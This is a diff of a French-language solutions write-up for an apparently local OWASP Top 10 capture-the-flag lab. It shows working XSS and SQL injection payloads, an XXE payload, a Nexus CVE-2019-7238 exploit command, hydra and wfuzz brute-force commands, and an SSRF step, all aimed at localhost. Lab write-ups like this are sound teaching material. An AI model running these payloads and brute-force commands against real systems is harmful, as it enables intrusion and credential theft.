@@ -1,5 +1,4 @@
-# All solutions
-
+# Solution
 ## A01 - Contrôles d'accès défaillants
 
 La page est vulnérable à une Insecure Direct Object Reference (IDOR) car l'ID utilisateur est directement accessible via l'URL sans vérification d'autorisation, l'ID d'utilisateur est le hash MD5 du nom d'utilisateur. Nous pouvons observer dans le code source ce commentaire :
@@ -15,6 +14,7 @@ Nous avons donc http://localhost:8042/profile.php?id=20541eeb668da7d30c80c56f007
 
 Nous obtenons le flag.
 
+# Solution
 ## A02 - Défaillances cryptographiques
 
 Nous pouvons casser les différents hashs pour obtenir les mots de passe. Soit avec hashcat ou via des sites web comme crackstation.net.
@@ -39,6 +39,7 @@ Nous pouvons obtenir des informations dans le JWT aussi :
 }
 ```
 
+# Solution
 ## A03 - Injection
 
 Nous avons une page avec une injection SQL et une XSS. Pour la XSS, nous pouvons tester avec `<script>alert(1)</script>` dans le champ de recherche et cela fonctionne. Nous aurions pu aussi utiliser `"><svg/onload=alert(1)>` ou alors une polyglotte : 
@@ -46,6 +47,11 @@ Nous avons une page avec une injection SQL et une XSS. Pour la XSS, nous pouvons
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 Source : https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+
+Nous pouvons aussi utiliser l'outil [dalfox](https://github.com/hahwul/dalfox) (XSSStrike n'est plus maintenu..) pour trouver des XSS :
+```bash
+dalfox url http://localhost:8042/A03.php -X POST -d comment=test
+```
 
 Pour l'injection SQL nous pouvons tester avec SQLmap assez naturellement :
 ```bash
@@ -60,10 +66,12 @@ http://localhost:8042/A03.php?username=admi%27%20UNION%20ALL%20SELECT%20NULL%2CC
 
 Nous obtenons le flag.
 
+# Solution
 ## A04 - Conception non sécurisée
 
 Nous avons une page de récupération de mot de passe qui n'est pas sécurisée dans sa conception. En effet nous pouvons voir les messages d'erreurs sont trop explicites et donnent des informations sur les utilisateurs. Nous pouvons voir que le message d'erreur nous indique si l'utilisateur existe ou non. Une fois un utilisateur trouvé, en l'occurence `administrateur` nous pouvons récupérer le mot de passe via une question de "sécurité". Nous pouvons choisir la plus simple à trouver. Nous n'avons aucune limite de test donc nous pouvons essayer toutes les villes possibles pour récupérer ensuite le flag. Ici la ville est `Paris` et nous obtenons le flag.
 
+# Solution
 ## A05 - Mauvaise configuration de sécurité
 
 Nous avons une page qui parse le XML et qui affiche le contenu. Nous pouvons donc tester une attaque XXE. Nous pouvons tester avec le payload suivant :
@@ -97,6 +105,7 @@ Nous pouvons donc obtenir le flag :
  </userInfo>
 ```
 
+# Solution
 ## A06 - Composants vulnérables et obsolètes
 
 Le serveur Nexus utilisé est vulnérable à la CVE 2019-7238. Nous pouvons donc l'exploiter avec le script suivant :
@@ -109,12 +118,23 @@ python3 CVE-2019-7238.py http://localhost:8081/ "cat /etc/flag.txt"
 
 Nous obtenons le flag.
 
+Si cela ne fonctionne pas il faut lancer cette commande :
+```bash
+curl -v -u admin:admin123 --upload-file /tmp/pom.xml http://localhost:8081/repository/maven-releases/org/foo/1.0/foo-1.0.po > /dev/null 2>&1
+```
+
+# Solution
 ## A07 - Identification et authentification de mauvaise qualité
 
 Nous pouvons voir que nous avons SAP Connexion, c'est donc une connexion pour un serveur SAP. Nous avons une liste des utilisateurs par défaut ici : https://github.com/danielmiessler/SecLists/blob/master/Usernames/sap-default-usernames.txt
 Nous pouvons donc lancer des attaques par force brute sur ces utilisateurs. Nous pouvons utiliser hydra ou des outils de fuzzing pour cela :
 ```bash
 wfuzz -z file,/usr/share/wordlists/seclists/Usernames/sap-default-usernames.txt -d "username=FUZZ&password=test" http://localhost:8042/login.php
+```
+
+Avec hydra :
+```bash
+hydra -L /usr/share/wordlists/seclists/Usernames/sap-default-usernames.txt -p test -s 8042 localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Nom d'utilisateur incorrect"
 ```
 Nous pouvons voir que nous avons trouvé un utilisateur via ce fuzzing. Nous pouvons donc lancer une attaque par force brute sur les mots de passe.
 
@@ -125,16 +145,24 @@ Nous avons :
 wfuzz -z file,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -d "username=<USER>&password=FUZZ" http://localhost:8042/login.php
 ```
 
+et avec hydra :
+```bash
+hydra -l SOLMAN_ADMIN -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -s 8042 localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Mot de passe incorrect"
+```
+
 Nous obtenons le flag en trouvant le bon utilisateur et le bon mot de passe, ici il faut regarder le nombre de caractères que la page nous renvoie pour savoir si le mot de passe est bon ou non.
 
+# Solution
 ## A08 - Manque d'intégrité des données et du logiciel
 
 Repondez à la question pour obtenir le flag.
 
+# Solution
 ## A09 - Carence des systèmes de contrôle et de journalisation
 
 Repondez à la question pour obtenir le flag.
 
+# Solution
 ## A10 - SSRF (Falsification de requête côté serveur)
 
 Nous pouvons récuperer des pages Web depuis la page A10.php, nous pouvons voir que nous voulons accèder à un flag flag_ssrf.txt mais nous n'avons pas la permission. Nous pouvons donc essayer de récupérer le fichier flag_ssrf.txt via une SSRF. Nous allons donc récupérer le fichier comme ceci :
@@ -145,3 +173,4 @@ Nous pouvons récuperer des pages Web depuis la page A10.php, nous pouvons voir 
     ```
 
 Nous obtenons le flag.
+
